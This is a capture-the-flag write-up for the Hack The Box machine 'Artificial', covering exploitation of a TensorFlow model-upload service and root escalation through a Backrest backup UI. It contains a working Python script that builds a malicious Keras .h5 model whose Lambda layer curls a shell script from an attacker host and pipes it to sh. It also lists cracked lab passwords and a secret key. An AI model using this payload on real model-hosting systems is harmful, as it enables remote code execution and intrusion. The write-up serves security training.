# Artificial

> [https://app.hackthebox.com/machines/Artificial](https://app.hackthebox.com/machines/Artificial)

<img width="1006" height="362" alt="capa" src="https://github.com/user-attachments/assets/23cba7d5-afe5-421e-8e3f-8ace0a5e8f33" />

## Table of Contents

* [About](#about)
* [References](#references)
* [Reconnaissance](#reconnaissance)
* [Dashboard](#dashboard)
* [TensorFlow RCE](#tensorflow-rce)
* [SSH Access](#ssh-access)
* [Privilege Escalation](#privilege-escalation)
* [Conclusion](#conclusion)

## About

Artificial is an easy-difficulty Linux machine that showcases exploiting a web application used to run AI models with Tensorflow and the Backrest web UI by abusing the backup and restore functionalities and the restic utility used by the application. 

## References

* [Backrest (GitHub)](https://github.com/garethgeorge/backrest)
* [Restic: GTFOBins](https://gtfobins.github.io/gtfobins/restic/)
* [TensorFlow security](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md)
* [AI model RCE (HackTricks)](https://book.hacktricks.wiki/en/AI/AI-Models-RCE.html)
* [TensorFlow / Keras model saving](https://www.tensorflow.org/guide/keras/serialization_and_saving)

## Reconnaissance

Nmap revealed two open ports: OpenSSH and an Nginx web server.

* **22**: OpenSSH 8.2p1 Ubuntu
* **80**: nginx 1.18.0 (Ubuntu)
 
<img width="1900" height="535" alt="0" src="https://github.com/user-attachments/assets/a74e4b02-bfdc-42c0-a63d-2f63e474ec8d" />

<br>
<br>

Accessing the web server redirected to `http://artificial.htb/`, so I added the hostname to the _/etc/hosts_ file to resolve it locally.

<img width="1920" height="1054" alt="1" src="https://github.com/user-attachments/assets/57f4f02b-0d1e-4f31-ac20-af1292ae004b" />

From the website:

**Artificial: *Empowering AI for the future***

_"Artificial offers state-of-the-art AI model building, testing, and deployment with a user-friendly interface. Whether you're a researcher, developer, or AI enthusiast, Artificial provides the tools and platform to innovate and experiment with cutting-edge AI technologies."_

Directory brute-forcing discovered 4 endpoints, and a JavaScript file (__/static/js/scripts.js__) revealed a hidden upload page __/upload_model__:

- __/login__: (Status: 200) [Size: 857]
- __/register__: (Status: 200) [Size: 952]
- __/logout__: (Status: 302) [Size: 189] [--> __/__]
- __/dashboard__: (Status: 302) [Size: 199] [--> __/login__]
- __/upload_model__: (Status: 405 _GET_) [Size: 153] / (Status: 302 _POST_) [Size: 199] [--> __/login__]

## Dashboard

*"Upload, manage, and run your AI models here."*

Logging in presented the dashboard for AI model building, which instructed to install the necessary [requirements](http://artificial.htb/static/requirements.txt) or use a specific [Dockerfile](http://artificial.htb/static/Dockerfile). It also presented a file upload form for submitting models.

<img width="1920" height="1056" alt="2" src="https://github.com/user-attachments/assets/27ef6436-0844-438c-b8cf-81387a3b7ee3" />

From the _requirements.txt_ file, the only Python library required was `tensorflow-cpu==2.13.1`.

**Dockerfile**:

```Dockerfile
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

The website expected a .__h5__ file format. After uploading a file, the model was assigned an *ID* and the site revealed two more routes: __/run_model__ and __/delete_model__.

<img width="1920" height="707" alt="3" src="https://github.com/user-attachments/assets/cf2a7baf-a4e6-4603-8582-bb4e04d27a3f" />

From this point I assumed the web server would execute the uploaded file. The next step was to create malicious code to potentially take control of the web server.

## TensorFlow RCE

From [___TensorFlow Github___](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md):

___TensorFlow models are programs__: "TensorFlow [models](https://developers.google.com/machine-learning/glossary/#model) (to use a term commonly used by machine learning practitioners) are expressed as programs that TensorFlow executes. TensorFlow programs are encoded as computation [graphs](https://developers.google.com/machine-learning/glossary/#graph). Since models are practically programs that TensorFlow executes, using untrusted models or graphs is equivalent to running untrusted code._

_If you need to run untrusted models, execute them inside a [sandbox](https://developers.google.com/code-sandboxing). Memory corruptions in TensorFlow ops can be recognized as security issues only if they are reachable and exploitable through production-grade, benign models."_

<br>

From [___HackTricks Wiki___](https://book.hacktricks.wiki/en/AI/AI-Models-RCE.html):

_"Machine Learning models are usually shared in different formats, such as ONNX, TensorFlow, PyTorch, etc. These models can be loaded into developers machines or production systems to use them. Usually the models shouldn't contain malicious code, but there are some cases where the model can be used to execute arbitrary code on the system as intended feature or because of a vulnerability in the model loading library."_

Because the application loaded uploaded _.h5_ files directly, I embedded a payload that executed curl to fetch and run a reverse shell script inside a Lambda layer of a Keras model.

```python
import tensorflow as tf

def pwn(x):
    import os
    os.system("curl http://<attacker-ip>:<port>/shell.sh | sh")
    return x

if __name__ == "__main__":
    model = tf.keras.Sequential()
    model.add(tf.keras.layers.Input(shape=(64,)))
    model.add(tf.keras.layers.Lambda(pwn))
    model.compile()
    model.save("pwn.h5")
```

<img width="1898" height="661" alt="4" src="https://github.com/user-attachments/assets/968bf44f-a7cf-4863-87a9-392be07f1242" />

### */run_model* route in *app.py*:

```python
@app.route('/run_model/<model_id>')
def run_model(model_id):
    if ('user_id' in session):
        username = session['username']
        if not (User.query.filter_by(username=username).first()):
            return redirect(url_for('login'))
    else:
        return redirect(url_for('login'))

    model_path = os.path.join(app.config['UPLOAD_FOLDER'], f'{model_id}.h5')

    if not os.path.exists(model_path):
        return redirect(url_for('dashboard'))

    try:
        model = tf.keras.models.load_model(model_path) # run malicious .h5 file

        hours = np.arange(0, 24 * 7).reshape(-1, 1)
        predictions = model.predict(hours)

        days_of_week = ["Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday"]
        daily_predictions = {f"{days_of_week[i // 24]} - Hour {i % 24}": round(predictions[i][0], 2) for i in range(len(predictions))}

        max_day = max(daily_predictions, key=daily_predictions.get)
        max_prediction = daily_predictions[max_day]

        model_summary = []
        model.summary(print_fn=lambda x: model_summary.append(x))
        model_summary = "\n".join(model_summary)

        return render_template(
            'run_model.html',
            model_summary=model_summary,
            daily_predictions=daily_predictions,
            max_day=max_day,
            max_prediction=max_prediction
        )
    except Exception as e:
        print(e)
        return redirect(url_for('dashboard'))
```

## SSH Access

After gaining a foothold, I inspected the source code of the application (__app.py__), which revealed that it was running the Flask framework with the secret key `Sup3rS3cr3tKey4rtIfici4L`. The database used by the application was __users.db__.

I extracted the __users.db__ file locally and pulled password hashes from the _user_ table. The account __gael__ was the only active user of interest. Using _hashcat_ with _rockyou.txt_, I cracked the hash and recovered the password `mattp005numbertwo`, which I used to SSH into the machine.

<img width="1904" height="849" alt="5" src="https://github.com/user-attachments/assets/4b1923c5-8cff-43e2-8287-bc9c4eb5a180" />

## Privilege Escalation

Further enumeration revealed an interesting directory: __/opt/backrest__.

From [___Backrest Github___](https://github.com/garethgeorge/backrest): 

_"Backrest is a web-accessible backup solution built on top of [restic](https://restic.net/). Backrest provides a WebUI which wraps the restic CLI and makes it easy to create repos, browse snapshots, and restore files. Additionally, Backrest can run in the background and take an opinionated approach to scheduling snapshots and orchestrating repo health operations."_

Interestly, two files were not owned by root, but instead by __app__ and the __ssl-cert__ group: _backrest (ELF 64-bit LSB executable)_ and _install.sh_. I could see from the install script that the bound port for the service is __9898__. I then establish a ssh tunnel to access the service on my browser and it asked for authentication.

<img width="1920" height="437" alt="7" src="https://github.com/user-attachments/assets/32c72e55-fd2a-4678-a566-9865824a7f58" />

At this point I did not have working credentials, but after more enumeration I found a backup for Backrest at __/var/backups/backrest_backup.tar.gz__. This file was owned by _root_ but was readable by the _sysadm_ group, and _gael_ was a member of that group.

Knowing this, I extracted the backup and inspected it, which revealed files of interest such as __jwt-secret__ and __config.json__. Inside the JSON file was a password hash for __backrest_root__ encoded with base64; decoding and cracking the hash revealed the password to be `!@#$%^`. This allowed me to log in to the _Backrest_ web UI, create a backup of the __/root/.ssh__ folder, escalate my privileges to root and complete the challenge.

<img width="1908" height="952" alt="8" src="https://github.com/user-attachments/assets/f088178a-fbfc-4554-bafb-5f81afa17db2" />

<img width="1907" height="963" alt="11" src="https://github.com/user-attachments/assets/f1679b0e-944d-4e4e-b935-1272e6fb6c96" />

## Conclusion

Artificial demonstrated how running untrusted code and backup tooling could expose powerful attack surfaces:

* Uploading untrusted TensorFlow models led to remote code execution.
* Backup repositories and misconfigured file permissions allowed retrieval of credentials.
* Backrest access and recovered SSH material enabled final privilege escalation.

